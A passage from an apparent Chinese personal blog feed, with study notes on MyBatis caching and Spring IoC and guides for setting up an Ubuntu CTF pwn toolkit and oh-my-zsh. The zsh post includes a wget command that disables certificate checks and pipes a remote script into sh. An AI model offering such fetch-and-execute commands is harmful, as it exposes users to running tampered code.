class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    System.out.println(user==user2);  <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">    sqlSession.close();<span class="comment">//关闭资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>sqlSession相同，查询条件不同</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById3</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行增删改的操作，一级缓存失效</span></span><br><span class="line">        <span class="comment">//对ID为1的用户进行修改，然后再查询，以及缓存失效</span></span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(user2);</span><br><span class="line"></span><br><span class="line">        System.out.println(user==user2);</span><br><span class="line"></span><br><span class="line">        sqlSession.close();<span class="comment">//关闭资源</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div></li><li><p>sqlSession相同，两次查询之间执行了增删改操作</p><p>增加方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser</span><span class="params">(Map map)</span>;</span><br></pre></td></tr></table></figure></div><p>编写sql</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;update id=<span class="string">&quot;updateUser&quot;</span> parameterType=<span class="string">&quot;map&quot;</span>&gt;</span><br><span class="line">    update user <span class="type">set</span> <span class="variable">name</span> <span class="operator">=</span> #&#123;name&#125; <span class="type">where</span> <span class="variable">id</span> <span class="operator">=</span> #&#123;id&#125;</span><br><span class="line">&lt;/update&gt;</span><br></pre></td></tr></table></figure></div><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testQueryUserById</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">session</span> <span class="operator">=</span> MybatisUtils.getSession();</span><br><span class="line"></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> session.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.queryUserById(<span class="number">1</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;kuangshen&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;id&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    mapper.updateUser(map);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.queryUserById(<span class="number">1</span>);</span><br><span class="line">    System.out.println(user2);</span><br><span class="line">    System.out.println(user==user2);</span><br><span class="line">    session.close();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div></li><li><p>sqlSession相同，手动清除一级缓存</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById4</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 手动清除缓存，一级缓存失效</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">       <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">       <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">       System.out.println(user);</span><br><span class="line">  </span><br><span class="line">       sqlSession.clearCache();  <span class="comment">//手动清除缓存</span></span><br><span class="line">  </span><br><span class="line">       <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">       System.out.println(user2);</span><br><span class="line">  </span><br><span class="line">       System.out.println(user==user2);</span><br><span class="line">  </span><br><span class="line">       sqlSession.close();<span class="comment">//关闭资源</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="二级缓存"><a href="#二级缓存" class="headerlink" title="二级缓存"></a>二级缓存</h3><ul><li>全局缓存，一级缓存作用域太低。</li><li>基于namespace级别的缓存，一个对应二级缓存的名称空间</li></ul><p>第一步先开启的一个二级全局缓存:在【mybatis-config.xml】文件中</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;setting name=<span class="string">&quot;cacheEnabled&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>在mapper.xml中使用二级缓存</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;cache eviction=<span class="string">&quot;FIFO&quot;</span> flushInterval=<span class="string">&quot;60000&quot;</span> size=<span class="string">&quot;512&quot;</span> readOnly=<span class="string">&quot;true&quot;</span>/&gt;</span><br></pre></td></tr></table></figure></div><p>测试代码：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    二级缓存测试</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById05</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession2</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserMapper</span> <span class="variable">mapper2</span> <span class="operator">=</span> sqlSession2.getMapper(UserMapper.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper2.getUserById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(user=user2);</span><br><span class="line"></span><br><span class="line">        sqlSession2.close();</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h1 id="Day6-24-4-11上"><a href="#Day6-24-4-11上" class="headerlink" title="Day6-24.4.11上"></a>Day6-24.4.11上</h1><h2 id="Spring框架学习"><a href="#Spring框架学习" class="headerlink" title="Spring框架学习"></a>Spring框架学习</h2><p><strong>Spring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器（框架）。</strong></p><p>组成：</p><ul><li>核心容器：核心容器提供 Spring 框架的基本功能。核心容器的主要组件是<br>BeanFactory ，它是工厂模式的实现。BeanFactory 使用控制反转（IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。</li><li>Spring 上下文：Spring 上下文是一个配置文件，向 Spring 框架提供上下文信息。Spring 上下文<br>包括企业服务，例如 JNDI、EJB、电子邮件、国际化、校验和调度功能。</li><li>Spring AOP：通过配置管理特性，Spring AOP 模块直接将面向切面的编程功能 , 集成到了Spring框架中。所以，可以很容易地使 Spring 框架管理任何支持 AOP的对象。Spring AOP 模块为基于<br>Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖组件，就可以将声明性事务管理集成到应用程序中。</li><li>Spring DAO：JDBC DAO 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不<br>同数据库供应商抛出的错误消息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量（例如打开和关闭连接）。Spring DAO 的面向 JDBC 的异常遵从通用的 DAO 异常层次结构。</li><li>Spring ORM：Spring 框架插入了若干个 ORM 框架，从而提供了 ORM 的对象关系工具，其中包<br>括 JDO、Hibernate 和 iBatis SQL Map。所有这些都遵从 Spring 的通用事务和 DAO 异常层次结<br>构。</li><li>Spring Web 模块：Web 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文。所以，Spring 框架支持与 Jakarta Struts 的集成。Web 模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。</li><li>Spring MVC 框架：MVC 框架是一个全功能的构建 Web 应用程序的 MVC 实现。通过策略接口，<br>MVC 框架变成为高度可配置的，MVC 容纳了大量视图技术，其中包括 JSP、Velocity、Tiles、iText和 POI</li></ul><h3 id="IOC学习"><a href="#IOC学习" class="headerlink" title="IOC学习"></a>IOC学习</h3><p><strong>控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法</strong>，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了</p><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 11.png)</p><p><strong>控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（Dependency Injection,DI）。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Develop" scheme="https://juana-2u.github.io/tags/Develop/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu重新配置pwn环境</title>
    <link href="https://juana-2u.github.io/2024/04/02/ubuntu%E9%87%8D%E6%96%B0%E9%85%8D%E7%BD%AEpwn%E7%8E%AF%E5%A2%83/"/>
    <id>https://juana-2u.github.io/2024/04/02/ubuntu%E9%87%8D%E6%96%B0%E9%85%8D%E7%BD%AEpwn%E7%8E%AF%E5%A2%83/</id>
    <published>2024-04-02T11:55:47.000Z</published>
    <updated>2024-04-02T11:57:08.539Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>重新安装好了镜像文件之后，先去换源，上一个文件已经写过怎么把ubantu换源的方法，还原之后要更新一下apt<br>命令：<code>apt update </code> <code>apt upgrade</code></p><h3 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h3><p>首先进入root用户(当然愿意在命令前加sudo也可以)：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - root</span><br></pre></td></tr></table></figure></div><p>然后执行所有升级：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade -y</span><br></pre></td></tr></table></figure></div><p>安装编译Python源程序所需的包：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install build-essential -y</span><br><span class="line">apt install libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev -y</span><br><span class="line">apt-get install zlib1g-dev</span><br></pre></td></tr></table></figure></div><p>进入应用目录</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/<span class="built_in">bin</span></span><br><span class="line">mkdir python</span><br><span class="line">cd python</span><br></pre></td></tr></table></figure></div><p>下载python 源程序压缩包，各版本链接可以在<a class="link"   href="https://www.python.org/ftp/python/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>获取，这里以3.9.0为例</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/<span class="number">3.9</span><span class="number">.0</span>/Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br><span class="line">tar -xzvf Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br></pre></td></tr></table></figure></div><p>配置</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Python-<span class="number">3.9</span><span class="number">.0</span></span><br><span class="line">./configure --enable-optimizations</span><br></pre></td></tr></table></figure></div><p>编译和安装python</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div><p>安装完成后，输入python3，如果进入python命令行就说明安装成功了</p><h3 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h3><p>命令：<code>apt install vim</code></p><h3 id="安装sublime-text"><a href="#安装sublime-text" class="headerlink" title="安装sublime-text"></a>安装sublime-text</h3><p>直接在software软件下载就好。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678421855414-a481bcf6-963d-4660-a4f9-a75deed5a9dd.png#averageHue=%23796f60&clientId=u295b0ab2-9a27-4&from=paste&height=718&id=ub5a99f4c&originHeight=898&originWidth=1001&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=243328&status=done&style=none&taskId=ud51d2f72-4a1f-46b8-be53-040e3e39257&title=&width=800.8"                      alt="image.png"                ><br>下载的时候发生报错，发现是没有安装 ca-certificates 的软件包 ：<br>命令：<code>sudo apt install ca-certificates</code></p><h3 id="3-安装LibcSearch"><a href="#3-安装LibcSearch" class="headerlink" title="3.安装LibcSearch"></a>3.安装LibcSearch</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"> </span><br><span class="line">cd LibcSearcher</span><br><span class="line"> </span><br><span class="line">python3 setup.py develop</span><br></pre></td></tr></table></figure></div><p>这里有一个报错就是python的版本问题，直接改为python3就可以运行了</p><h3 id="4-安装qemu"><a href="#4-安装qemu" class="headerlink" title="4.安装qemu"></a>4.安装qemu</h3><p> 使用apt list qemu*可查看所有前缀为qemu的包。可以看到这里有很多支持不同架构的qemu。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678434233284-a4b15f8f-1f29-4448-8c23-792824345a99.png#averageHue=%23310b26&clientId=ue3bd1ed6-6e56-4&from=paste&height=531&id=ue8bc7b33&originHeight=531&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&size=177816&status=done&style=none&taskId=ub2950c72-17c6-4fd1-b1e6-aa37b4af90c&title=&width=729"                      alt="image.png"                ><br>根据自己的需要安装对应架构的包即可。一般最为常用的是x86架构：apt install qemu-system-x86，注意不能只输入apt install qemu。  </p><h2 id="5-安装pwntools"><a href="#5-安装pwntools" class="headerlink" title="5.安装pwntools"></a>5.安装pwntools</h2><p> pwntools是pwn最常用的一个python包。<br>首先需要安装pip：<code>apt install python3-pip</code><br>然后安装pwntools：<code>pip install pwntools</code><br>完成  </p><h2 id="6-安装pwndbg"><a href="#6-安装pwndbg" class="headerlink" title="6.安装pwndbg"></a>6.安装pwndbg</h2><p>首先就是直接使用的git clone的方法<br>pwndbg是gdb的插件，帮助我们在做题时进行调试。<br>首先安装git：<code>apt install git</code><br>然后拉取git库：<code>git clone https://github.com/pwndbg/pwndbg</code><br>进入pwndbg目录下，运行bash脚本<code>./setup.sh</code>开始安装<br> <a class="link"   href="https://github.com/pwndbg/pwndbg" >https://github.com/pwndbg/pwndbg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678445985072-829a1163-c7e7-47ae-aaa5-01159fd99d4e.png#averageHue=%23310a25&clientId=ue3bd1ed6-6e56-4&from=paste&height=445&id=u7b4cfd45&originHeight=445&originWidth=1112&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86083&status=done&style=none&taskId=ub387d71e-555f-4a03-835a-f1c4aa7cf26&title=&width=1112"                      alt="image.png"                ><br>后面就有了dbg的标识，但还是有报错的信息<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678446052397-bda26f69-adab-417c-aeaa-91c7585d2db3.png#averageHue=%23300b26&clientId=ue3bd1ed6-6e56-4&from=paste&height=736&id=u5afebc81&originHeight=736&originWidth=1066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=212125&status=done&style=none&taskId=u2085aa68-6564-40b2-8267-82d4c9d35f2&title=&width=1066"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678446084916-27397f2b-c701-4fa1-9568-a0fdbdc25b5c.png#averageHue=%23300a25&clientId=ue3bd1ed6-6e56-4&from=paste&height=568&id=ub9369de3&originHeight=568&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128560&status=done&style=none&taskId=ub1ea0fcb-d5b0-4ace-9f31-8927cb74b1f&title=&width=1069"                      alt="image.png"                ><br>有这样的报错貌似没啥关系，但还是可以修的<br>直接在~下输入pip的命令<code>python3 -m pip install launchpadlib</code><br>dbg退出命令：<code>quit/exit</code></p><blockquote><p>敢说一下午搞了这个啥也不是<br>一开始报的错误是超时的错误，听说可以在ubantu虚拟机里搞一个梯子挂着，clash for Linux最后尝试失败，不知道是订阅的链接失败还是说下载安装的方法出现错误<br>还有就是ubantu网络的代理设置：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678450477029-4f72517b-cbc7-44fc-a65b-8053efc7af8a.png#averageHue=%23ebeaea&clientId=u8e94baf1-7dc7-4&from=paste&height=694&id=u54ddc5da&originHeight=868&originWidth=1516&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60036&status=done&style=none&taskId=u9394b321-b683-4a1b-bcc6-24683b0cd1c&title=&width=1212.8"                      alt="image.png"                ><br>设置栏的网络的地方，选择work proxy的选项<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678450509837-e91cd2ec-c582-4629-a929-05fd39429c4b.png#averageHue=%23c7c6c5&clientId=u8e94baf1-7dc7-4&from=paste&height=428&id=u1452e30a&originHeight=535&originWidth=620&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30425&status=done&style=none&taskId=ua892cdd0-8c27-4d35-a76d-0a88aac5ef1&title=&width=496"                      alt="image.png"                ><br>用手动的设置代理的ip和端口。要看当时clash for linux报的是什么端口。<br>第二个就是使用git ssh免密安装的方式，但貌似还是不成功。<br>同时有几种方法，还是具有借鉴作用的：<br>M1： <a class="link"   href="https://github.com/pwndbg/pwndbg" >https://github.com/pwndbg/pwndbg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 将https换成git也就是换成git:&#x2F;&#x2F;<a class="link"   href="https://github.com/pwndbg/pwndbg" >github.com&#x2F;pwndbg&#x2F;pwndbg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>M2：取消代理的方法，没试过 不会<a class="link"   href="https://blog.csdn.net/dashi_lu/article/details/89641778" >https://blog.csdn.net/dashi_lu&#x2F;article&#x2F;details&#x2F;89641778 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>M3：</p><ol><li>安装git：<code>sudo apt-get install git</code></li><li>配置用户信息</li></ol><p><code>$ git config --global user.name &quot;your name&quot;</code><br><code>$ git config --global user.email &quot;your email address&quot;</code></p><ol start="3"><li>初始化本地仓库设置<code>git init</code></li></ol><p>通过ssh连接github</p><ol start="4"><li>安装ssh</li></ol><p><code>sudo apt-get install ssh</code><br>ssh-keygen 会确认密钥的存储位置和文件名（默认是 .ssh&#x2F;id_rsa）,然后他会要求你输入两次密钥口令，留空即可。所以一般选用默认，全部回车即可。 如下图所示<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678450237175-ddd78380-d4cd-4dcc-b5b8-755d9f7f5368.png#averageHue=%23310b25&clientId=u8e94baf1-7dc7-4&from=paste&id=u51231c4a&originHeight=603&originWidth=915&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=140432&status=done&style=none&taskId=u48be8a1b-69cc-42c9-a05e-5052b14b778&title="                      alt="image.png"                ></p><ol start="5"><li>创建密钥文件<code>ssh-keygen -t rsa -C &quot;你的github账号邮箱&quot;</code></li><li>将公钥添加到GitHub账户</li></ol><p>（1）将id_rsa.pub文件内容全部复制；<br>（2）登陆到<a class="link"   href="https://so.csdn.net/so/search?q=GitHub&spm=1001.2101.3001.7020" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上，右上角小头像-&gt;Setting-&gt;SSH and GPG keys中，点击new SSH key。</p><ol start="7"><li>ssh测试<code>ssh -T git@github.com</code></li></ol><p>结果为这个 则表示成功：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678450322386-5d2a4c83-a6ee-48a1-b7e6-3c52c2f95492.png#averageHue=%23320d28&clientId=u8e94baf1-7dc7-4&from=paste&height=27&id=u5e52a3ba&originHeight=34&originWidth=793&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10349&status=done&style=none&taskId=uc406a0c8-318f-4ce7-a092-8319a108e74&title=&width=634.4"                      alt="20210506201033697.png"                > 8. 使用使用 git clone <a class="link"   href="https://github.com/Z3Prover/z3.git" >https://github.com/Z3Prover/z3.git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，测试是否真的成功？<br>在别人的机器上又报了如下错误：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678450364621-b02153de-faff-4304-a92d-b703cd38ad2f.png#averageHue=%23403271&clientId=u8e94baf1-7dc7-4&from=paste&height=61&id=u6b2e5359&originHeight=76&originWidth=732&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18605&status=done&style=none&taskId=u8d76f9d6-924f-44aa-91aa-71a288ea002&title=&width=585.6"                      alt="20210506201256239.png"                ></p><ol start="5"><li>原因是你的git buffer太低了。为解决上述报错，需要执行：<br><code>git config --global http.postBuffer 50M</code><br>再次执行 git clone的命令 就好了<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1678450377846-75857bab-6cda-4e44-96a4-25c8eed0874f.png#averageHue=%23300b26&clientId=u8e94baf1-7dc7-4&from=paste&height=126&id=u847f303c&originHeight=158&originWidth=804&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44177&status=done&style=none&taskId=u2d1c7d5f-0567-4241-87cf-3bd0e7a12fe&title=&width=643.2"                      alt="20210506201544505.png"                ></li></ol></blockquote><h2 id="6-安装pwntools"><a href="#6-安装pwntools" class="headerlink" title="6.安装pwntools"></a>6.安装pwntools</h2><p> pwntools是pwn最常用的一个python包。<br>首先需要安装pip：<code>apt install python3-pip</code><br>然后安装pwntools：<code>pip install pwntools</code><br>完成  </p><h2 id="7-ubantu如何运行exe可执行文件"><a href="#7-ubantu如何运行exe可执行文件" class="headerlink" title="7.ubantu如何运行exe可执行文件"></a>7.ubantu如何运行exe可执行文件</h2><p>命令：<code>sudo apt-get install wine </code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://juana-2u.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu安装zsh</title>
    <link href="https://juana-2u.github.io/2024/04/02/ubuntu%E5%AE%89%E8%A3%85/"/>
    <id>https://juana-2u.github.io/2024/04/02/ubuntu%E5%AE%89%E8%A3%85/</id>
    <published>2024-04-02T11:53:36.000Z</published>
    <updated>2024-04-02T11:55:22.692Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1、首先，查看系统里所有的shell<br /><code>cat /etc/shells</code><br />2.安装zsh</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install zsh #安装zsh</span><br><span class="line"></span><br><span class="line">chsh -s /bin/zsh #将zsh设置成默认shell（不设置的话启动zsh只有直接zsh命令即可）</span><br></pre></td></tr></table></figure></div><p><a name="vhwdv"></a></p><h2 id="3、安装oh-my-zsh"><a href="#3、安装oh-my-zsh" class="headerlink" title="3、安装oh-my-zsh"></a>3、安装oh-my-zsh</h2><p>事实上如果我们要是自己配置zsh的配置的话会比较麻烦，好在github上有大佬制作了一个配置文件，“oh-my-zsh”，这是目前zsh中最流行的一个配置了。（没装git ：apt install git）<br />一般网上的一键式安装方法是（亲测没用）：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget 下载脚本并执行（网站好像是证书过期了curl -fsSL 的下载方式不行）</span><br><span class="line">wget --no-check-certificate https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure></div><blockquote><p>但是不知道为什么，我在我的centos的云服务器中安装成功了，Ubuntu子系统却是报404错误，怀疑是hosts的问题，但是问题不大，我也懒得改hosts，就找了一个国内的镜像源下载了oh-my-zsh的install.sh</p></blockquote><div class="highlight-container" 